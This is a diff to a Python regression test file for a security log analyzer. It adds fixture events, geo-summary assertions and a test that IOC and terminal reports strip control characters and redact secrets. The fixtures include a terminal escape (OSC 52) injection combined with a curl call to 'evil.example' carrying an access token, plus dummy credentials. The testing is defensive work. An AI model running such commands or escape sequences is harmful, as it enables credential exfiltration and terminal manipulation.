@@ -111,8 +111,22 @@ class OutputRegressionTests(unittest.TestCase):
                 raw_line="", ip="1.1.1.1",
                 details={"source_type": "web-access", "src_ip": "1.1.1.1"},
             ),
+            LogEvent(
+                id="geo-3", timestamp="2024-03-15T10:00:02",
+                level=ThreatLevel.MEDIUM, category="Web", source="web-access",
+                source_file="access.log", message="GET /admin from 9.9.9.9",
+                raw_line="", ip="9.9.9.9",
+                details={"source_type": "web-access", "src_ip": "9.9.9.9"},
+            ),
+            LogEvent(
+                id="geo-4", timestamp="2024-03-15T10:00:03",
+                level=ThreatLevel.INFO, category="测试", source="fixture",
+                source_file="events.log", message="internal event",
+                raw_line="", ip="10.0.0.5",
+                details={"source_type": "fixture", "src_ip": "10.0.0.5"},
+            ),
         ]
-        result = ParseResult("mixed.log", "Fixture", events, ParseStats(total=2, high=1, medium=1))
+        result = ParseResult("mixed.log", "Fixture", events, ParseStats(total=4, high=1, medium=2, info=1))
         summary = AnalysisSummary(
             risk_score=40,
             risk_level=ThreatLevel.MEDIUM,
@@ -141,6 +155,8 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertIn("Australia", html)
         self.assertIn("8.8.8.8", html)
         self.assertIn("1.1.1.1", html)
+        self.assertIn("已排除 1 个内网/回环/保留源 IP", html)
+        self.assertIn("1 个公网源 IP 缺少地理数据", html)
         self.assertNotIn("边界 SVG", html)
         self.assertNotIn("正式版", html)
 
@@ -305,6 +321,22 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertIn("/upload/shell.jsp", iocs["file_paths"])
         self.assertIn("## IP", report)
 
+    def test_ioc_text_export_strips_controls_and_redacts_secrets(self):
+        iocs = {key: [] for key in ("ips", "domains", "urls", "file_paths", "hashes", "users", "processes", "commands")}
+        iocs["commands"] = [
+            "\x1b]52;c;SGFja2Vk\x07curl http://evil.example/a?access_token=super-secret",
+            "Authorization: Bearer abcdefghijklmnop",
+        ]
+
+        report = format_ioc_report(iocs)
+
+        self.assertNotIn("\x1b", report)
+        self.assertNotIn("SGFja2Vk", report)
+        self.assertNotIn("super-secret", report)
+        self.assertNotIn("abcdefghijklmnop", report)
+        self.assertIn("access_token=<redacted>", report)
+        self.assertIn("Authorization=<redacted>", report)
+
     def test_terminal_report_can_cap_large_alert_lists(self):
         content = "".join(
             "%d.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
@@ -333,7 +365,7 @@ class OutputRegressionTests(unittest.TestCase):
             category="Web攻击",
             source="fixture",
             source_file="access.log",
-            message=f"{marker}message",
+            message=f"{marker}password=hunter2",
             raw_line=f"raw {marker}",
             ip="198.51.100.20",
             details={
@@ -356,7 +388,7 @@ class OutputRegressionTests(unittest.TestCase):
             mitre_attack="T1190",
             mitre_phase="初始访问",
             affected_events=[event.id],
-            evidence=[f"evidence {marker}"],
+            evidence=[f"evidence {marker} access_token=super-secret"],
             recommendation=f"rec {marker}",
             timestamp=event.timestamp,
             confidence="high",
@@ -385,6 +417,9 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertNotIn("\x1b]52", text)
         self.assertNotIn("\x1b[31m", text)
         self.assertNotIn("\x07", text)
+        self.assertNotIn("hunter2", text)
+        self.assertNotIn("super-secret", text)
+        self.assertIn("access_token=<redacted>", text)
 
     def test_terminal_truncation_uses_display_width_for_cjk_text(self):
         from bla.output.terminal import _display_width, _truncate_text
